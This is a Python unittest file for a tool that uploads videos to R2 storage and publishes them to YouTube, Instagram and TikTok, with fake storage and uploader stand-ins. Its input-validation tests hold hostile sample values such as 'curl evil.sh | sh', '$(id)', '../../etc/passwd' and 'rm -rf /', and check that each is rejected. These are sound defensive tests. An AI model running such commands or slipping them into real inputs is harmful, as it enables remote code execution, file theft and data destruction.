"""
CI -> panel koprusu: tools/r2_push.py ve tools/panel_publish.py.

Ag YOK, boto3 YOK: R2 yerine bellekte sahte istemci, yukleyici yerine sahte
`runner`. Gercek hesaplara ve token'lara hicbir test dokunmaz.
"""
import hashlib
import json
import sys
import tempfile
import unittest
from datetime import datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "tools"))

import panel_publish as pp          # noqa: E402
import r2                           # noqa: E402
import r2_push                      # noqa: E402

NOW = datetime(2026, 11, 8, 15, 0, 0, tzinfo=timezone.utc)
SID = "p001-tay-chatbot-under-a-day"
RID = "a" * 32


class ClientError(Exception):
    def __init__(self, code):
        self.response = {"Error": {"Code": code}}


class FakeR2:
    """boto3 S3 istemcisinin kullandigimiz kucuk parcasi."""

    def __init__(self):
        self.objects = {}
        self.log = []                       # (islem, anahtar) sirayla
        self.lie_about_size = False
        self.fail_put_prefix = None
        self.head_error = None

    def upload_file(self, path, bucket, key, ExtraArgs=None):
        self.objects[key] = Path(path).read_bytes()
        self.log.append(("upload", key))

    def get_object(self, Bucket, Key):
        import io
        return {"Body": io.BytesIO(self.objects[Key])}

    def head_object(self, Bucket, Key):
        if self.head_error and Key.startswith("ledger/"):
            raise self.head_error
        if Key not in self.objects:
            raise ClientError("404")
        n = len(self.objects[Key])
        return {"ContentLength": n + 1 if self.lie_about_size else n}

    def put_object(self, Bucket, Key, Body, ContentType=None):
        if self.fail_put_prefix and Key.startswith(self.fail_put_prefix):
            raise OSError("ag yok")
        self.objects[Key] = Body
        self.log.append(("put", Key))

    def download_file(self, bucket, key, dest):
        Path(dest).write_bytes(self.objects[key])

    def generate_presigned_url(self, op, Params, ExpiresIn):
        return f"https://r2.example/{Params['Key']}?exp={ExpiresIn}&sig=SECRETSIG"


def manifest(sid=SID, **over):
    m = {"id": sid, "series": "G", "title": "A chatbot lost it in a day", "description": "d",
         "tags": ["ai"], "duration": 37.2, "video": f"{sid}.mp4", "theme": "t", "privacy": "private",
         "captions": {"youtube": "y", "instagram": "ig caption", "tiktok": "tt"}}
    m.update(over)
    return m


def make_out(root: Path, sid=SID, video=b"VIDEO" * 100, **over) -> Path:
    d = root / "out" / sid
    d.mkdir(parents=True)
    (d / f"{sid}.mp4").write_bytes(video)
    (d / "manifest.json").write_text(json.dumps(manifest(sid, **over)))
    (d / "captions.md").write_text("# captions")
    return d


class Push(unittest.TestCase):
    def setUp(self):
        self._t = tempfile.TemporaryDirectory()
        self.tmp = Path(self._t.name)
        self.addCleanup(self._t.cleanup)
        self.c = FakeR2()

    def test_files_first_inbox_record_last(self):
        out = make_out(self.tmp)
        rec = r2_push.push(self.c, "b", out, "https://github.com/o/r/actions/runs/1", now=NOW)
        keys = [k for _, k in self.c.log]
        self.assertEqual(keys[-1], f"inbox/{SID}.json")
        self.assertEqual(set(keys[:-1]), {f"videos/{SID}/{SID}.mp4", f"videos/{SID}/manifest.json",
                                          f"videos/{SID}/captions.md"})
        self.assertEqual(rec["sha256"], hashlib.sha256(b"VIDEO" * 100).hexdigest())
        stored = json.loads(self.c.objects[f"inbox/{SID}.json"])
        self.assertEqual((stored["v"], stored["script_id"], stored["size_bytes"]), (1, SID, 500))
        self.assertEqual(stored["rendered_at"], "2026-11-08T15:00:00Z")

    def test_a_size_mismatch_stops_before_the_inbox_record(self):
        out = make_out(self.tmp)
        self.c.lie_about_size = True
        with self.assertRaises(SystemExit):
            r2_push.push(self.c, "b", out, now=NOW)
        self.assertNotIn(f"inbox/{SID}.json", self.c.objects)

    def test_bad_ids_and_missing_files_are_refused(self):
        for bad in ("../evil", "UPPER-case-id", "p1", "a/b/c", "x" * 90):
            out = self.tmp / bad.replace("/", "_")
            out.mkdir(exist_ok=True)
            (out / "manifest.json").write_text(json.dumps(manifest(bad)))
            with self.assertRaises(SystemExit, msg=bad):
                r2_push.push(self.c, "b", out, now=NOW)
        self.assertEqual(self.c.objects, {})
        out = make_out(self.tmp, "p002-no-captions")
        (out / "captions.md").unlink()
        with self.assertRaises(SystemExit):
            r2_push.push(self.c, "b", out, now=NOW)
        self.assertEqual(self.c.objects, {})


class Env(unittest.TestCase):
    def good(self, **over):
        e = {"SCRIPT_ID": SID, "PLATFORM": "youtube", "PRIVACY": "public", "REQUEST_ID": RID}
        e.update(over)
        return e

    def test_valid_inputs(self):
        self.assertEqual(pp.parse_inputs(self.good()),
                         {"sid": SID, "platform": "youtube", "privacy": "public", "rid": RID})

    def test_hostile_inputs_are_rejected(self):
        bad = [{"SCRIPT_ID": "p001; curl evil.sh | sh"}, {"SCRIPT_ID": "$(id)-aaa"},
               {"SCRIPT_ID": SID + "\n"}, {"SCRIPT_ID": "../../etc/passwd"}, {"SCRIPT_ID": ""},
               {"PLATFORM": "facebook"}, {"PLATFORM": "youtube;ls"}, {"PLATFORM": ""},
               {"PRIVACY": "everyone"}, {"REQUEST_ID": "short"}, {"REQUEST_ID": "A" * 32},
               {"REQUEST_ID": RID + "x"}, {"REQUEST_ID": ""}]
        for over in bad:
            with self.assertRaises(pp.Bad, msg=over):
                pp.parse_inputs(self.good(**over))

    def test_scrub_hides_secrets_but_not_short_noise(self):
        env = {"YOUTUBE_REFRESH_TOKEN": "1//0gSECRETTOKEN", "GH_PAT": "x"}
        out = pp.scrub("hata: 1//0gSECRETTOKEN gecersiz x", env)
        self.assertNotIn("SECRETTOKEN", out)
        self.assertIn("x gecersiz x".split()[0], out)

    def test_r2_client_needs_everything_and_https(self):
        with self.assertRaises(SystemExit):
            r2.client_from_env({})
        env = {"R2_ENDPOINT": "http://insecure", "R2_BUCKET": "b",
               "R2_ACCESS_KEY_ID": "k", "R2_SECRET_ACCESS_KEY": "s"}
        with self.assertRaises(SystemExit):
            r2.client_from_env(env)


class Runner:
    """publish/*.py yerine: ne cagrildigini kaydeder, gercek yukleyicinin biraktigi izi birakir."""

    def __init__(self, root: Path, code=0, stderr="", leave=None):
        self.root, self.code, self.stderr, self.leave = root, code, stderr, leave
        self.calls = []

    def __call__(self, cmd, **kw):
        self.calls.append((cmd, kw))
        if self.leave:
            self.leave(self.root)
        return type("P", (), {"returncode": self.code, "stdout": "", "stderr": self.stderr})()


def leave_youtube(root):
    man = root / "out" / SID / "manifest.json"
    m = json.loads(man.read_text())
    m["youtube_id"] = "uHYCPlQttiE"
    man.write_text(json.dumps(m))


def leave_instagram(root):
    (root / "content").mkdir(exist_ok=True)
    (root / "content/social.json").write_text(json.dumps(
        {SID: {"instagram": {"media_id": "123", "permalink": "https://www.instagram.com/reel/abc/"}}}))


class Run(unittest.TestCase):
    def setUp(self):
        self._t = tempfile.TemporaryDirectory()
        self.root = Path(self._t.name)
        self.addCleanup(self._t.cleanup)
        self.c = FakeR2()
        src = self.root / "src"
        src.mkdir()
        r2_push.push(self.c, "b", make_out(src), now=NOW)
        self.env = {"SCRIPT_ID": SID, "PLATFORM": "youtube", "PRIVACY": "unlisted", "REQUEST_ID": RID,
                    "YOUTUBE_REFRESH_TOKEN": "1//0gSECRETTOKEN", "GITHUB_SERVER_URL": "https://github.com",
                    "GITHUB_REPOSITORY": "o/r", "GITHUB_RUN_ID": "77"}

    def result(self, plat="youtube"):
        return json.loads(self.c.objects[f"results/{SID}.{plat}.json"])

    def go(self, runner, **env):
        e = dict(self.env, **env)
        return pp.run(e, self.c, "b", root=self.root, runner=runner, now=NOW)

    def test_youtube_success_records_the_id_and_passes_the_privacy(self):
        r = Runner(self.root, leave=leave_youtube)
        self.assertEqual(self.go(r), 0)
        cmd = r.calls[0][0]
        self.assertTrue(cmd[1].endswith("publish/youtube.py"))
        self.assertEqual(cmd[-2:], ["--privacy", "unlisted"])
        res = self.result()
        self.assertEqual((res["v"], res["ok"], res["request_id"], res["remote_id"]), (1, True, RID, "uHYCPlQttiE"))
        self.assertEqual(res["remote_url"], "https://youtu.be/uHYCPlQttiE")
        self.assertEqual(res["run_url"], "https://github.com/o/r/actions/runs/77")
        self.assertEqual(res["at"], "2026-11-08T15:00:00Z")

    def test_failure_is_reported_and_secrets_are_scrubbed(self):
        r = Runner(self.root, code=1, stderr="invalid_grant for 1//0gSECRETTOKEN")
        self.assertEqual(self.go(r), 1)
        res = self.result()
        self.assertFalse(res["ok"])
        self.assertNotIn("SECRETTOKEN", json.dumps(res))
        self.assertIn("youtube", res["error"])

    def test_a_result_is_written_even_when_the_download_fails(self):
        del self.c.objects[f"videos/{SID}/{SID}.mp4"]
        r = Runner(self.root)
        self.assertEqual(self.go(r), 1)
        self.assertEqual(r.calls, [])
        self.assertFalse(self.result()["ok"])

    def test_a_video_already_on_youtube_is_never_uploaded_twice(self):
        (self.root / "content").mkdir()
        (self.root / "content/published.json").write_text(json.dumps([{"id": SID, "youtube_id": "old123"}]))
        r = Runner(self.root)
        self.assertEqual(self.go(r), 0)
        self.assertEqual(r.calls, [])
        self.assertEqual(self.result()["remote_id"], "old123")

    def test_instagram_gets_a_presigned_url_and_reads_the_ledger(self):
        r = Runner(self.root, leave=leave_instagram)
        self.assertEqual(self.go(r, PLATFORM="instagram"), 0)
        cmd = r.calls[0][0]
        i = cmd.index("--video-url")
        self.assertIn("exp=3600", cmd[i + 1])
        res = self.result("instagram")
        self.assertEqual((res["ok"], res["remote_id"]), (True, "123"))
        self.assertTrue(res["remote_url"].startswith("https://www.instagram.com/"))
        self.assertNotIn("SECRETSIG", json.dumps(res))      # imzali adres sonuca sizmaz

    def test_tiktok_runs_its_uploader_without_extra_flags(self):
        r = Runner(self.root)
        self.assertEqual(self.go(r, PLATFORM="tiktok"), 0)
        self.assertTrue(r.calls[0][0][1].endswith("publish/tiktok.py"))
        self.assertEqual(len(r.calls[0][0]), 3)

    def test_a_manifest_for_another_video_is_refused(self):
        self.c.objects[f"videos/{SID}/manifest.json"] = json.dumps(manifest("p009-other-video")).encode()
        r = Runner(self.root)
        self.assertEqual(self.go(r), 1)
        self.assertEqual(r.calls, [])
        self.assertIn("uyusmuyor", self.result()["error"])

    def test_oversized_objects_are_not_downloaded(self):
        self.c.objects[f"videos/{SID}/{SID}.mp4"] = b"x" * 10
        orig = pp.MAX_VIDEO
        pp.MAX_VIDEO = 5
        self.addCleanup(setattr, pp, "MAX_VIDEO", orig)
        self.assertEqual(self.go(Runner(self.root)), 1)
        self.assertIn("buyuk", self.result()["error"])

    def test_hostile_input_runs_nothing_and_writes_nothing(self):
        before = dict(self.c.objects)
        r = Runner(self.root)
        self.assertEqual(self.go(r, SCRIPT_ID="x; rm -rf /"), 2)
        self.assertEqual(r.calls, [])
        self.assertEqual(self.c.objects, before)

    def test_success_writes_a_ledger_record_and_the_second_request_does_not_upload(self):
        r = Runner(self.root, leave=leave_youtube)
        self.assertEqual(self.go(r), 0)
        led = json.loads(self.c.objects[f"ledger/{SID}.youtube.json"])
        self.assertEqual(led["remote_id"], "uHYCPlQttiE")
        r2nd = Runner(self.root)
        self.assertEqual(self.go(r2nd, REQUEST_ID="b" * 32), 0)
        self.assertEqual(r2nd.calls, [])
        res = self.result()
        self.assertEqual((res["ok"], res["request_id"], res["remote_id"]), (True, "b" * 32, "uHYCPlQttiE"))
        self.assertIn("yeniden yuklenmedi", res["error"])

    def test_a_failed_upload_leaves_no_ledger_record(self):
        self.assertEqual(self.go(Runner(self.root, code=1)), 1)
        self.assertNotIn(f"ledger/{SID}.youtube.json", self.c.objects)

    def test_ledger_is_per_platform(self):
        self.assertEqual(self.go(Runner(self.root, leave=leave_youtube)), 0)
        r = Runner(self.root, leave=leave_instagram)
        self.assertEqual(self.go(r, PLATFORM="instagram"), 0)
        self.assertEqual(len(r.calls), 1)

    def test_if_the_ledger_cannot_be_read_nothing_is_uploaded(self):
        self.c.head_error = ClientError("500")
        r = Runner(self.root, leave=leave_youtube)
        self.assertEqual(self.go(r), 1)
        self.assertEqual(r.calls, [])
        self.assertIn("durdum", self.result()["error"])

    def test_a_corrupt_ledger_record_also_stops_the_upload(self):
        self.c.objects[f"ledger/{SID}.youtube.json"] = b"{not json"
        r = Runner(self.root)
        self.assertEqual(self.go(r), 1)
        self.assertEqual(r.calls, [])

    def test_a_ledger_write_failure_still_reports_success(self):
        orig = self.c.put_object

        def put(Bucket, Key, Body, ContentType=None):
            if Key.startswith("ledger/"):
                raise OSError("ag yok")
            return orig(Bucket=Bucket, Key=Key, Body=Body, ContentType=ContentType)
        self.c.put_object = put
        self.assertEqual(self.go(Runner(self.root, leave=leave_youtube)), 0)
        self.assertTrue(self.result()["ok"])

    def test_unwritable_result_is_a_failed_run(self):
        self.c.fail_put_prefix = "results/"
        self.assertEqual(self.go(Runner(self.root, leave=leave_youtube)), 1)


if __name__ == "__main__":
    unittest.main()
